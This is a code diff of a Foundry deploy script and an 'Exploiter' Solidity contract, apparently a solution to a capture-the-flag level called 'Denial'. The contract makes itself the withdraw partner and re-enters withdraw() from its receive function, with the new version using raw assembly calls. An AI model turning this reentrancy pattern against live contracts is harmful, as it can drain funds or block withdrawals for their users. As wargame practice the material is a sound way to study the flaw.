@@ -6,47 +6,56 @@ import {Script} from "forge-std/Script.sol";
 contract Deployer is Script {
     function run() external {
         vm.startBroadcast();
-        new Exploiter(0xc02F6DBd1C52461a15Af28E4982b491cd73C93f1);
+        new Exploiter(0x6185Be5dF343C299f9424B96A22296A5D4adcb10);
         vm.stopBroadcast();
     }
 }
 
 contract Exploiter {
-    IDenial public immutable denial;    
-
-    uint256 public limit = 100;
-
-    event Received(uint256 indexed value);
-    event Exploited(uint256 indexed value);
+    address public immutable denial;    
 
     constructor(address _instance) {
-        denial = IDenial(_instance);
+        denial = _instance;
     }
 
     function setPartner() external {
-        denial.setWithdrawPartner(address(this));
+        IDenial(denial).setWithdrawPartner(address(this));
     }
 
-    function exploit(uint256 _times) external {
-        uint256 i;
-        while (i < _times) {
-            _callContract();
-            i++;
+    function exploit() external {
+        _callContract(100);
+    }
+
+    function _callContract(uint8 _limit) internal {
+        if (denial.balance > _limit && !_call()) { 
+            _callContract(_limit--);
         }
     }
 
-    function exploit2(uint256 _target, uint256 _limit) external {
-        address(denial).call{value: _target - address(denial).balance}("");
-        limit = _limit;
-    }
-
-    function _callContract() internal {
-        if (address(denial).balance > limit) address(denial).call(abi.encodeWithSignature("withdraw()"));
+    function _call() internal returns (bool success) {
+        address target = denial;
+        assembly {
+            // Allocate memory for call
+            let ptr := mload(0x40)
+        
+            // Store function selector
+            mstore(ptr, 0x3ccfd60b00000000000000000000000000000000000000000000000000000000)
+        
+            // Call the contract
+            success := call(
+                gas(),           // Forward all gas
+                target,          // Target address
+                0,               // No ETH value
+                ptr,             // Input data pointer
+                4,               // Input data length (4 bytes for selector)
+                0,               // Output data pointer
+                0                // Output data length
+            )
+        }
     }
 
     receive() external payable {
-        emit Received(msg.value);
-        _callContract();
+        _callContract(100);
     }
 }
 
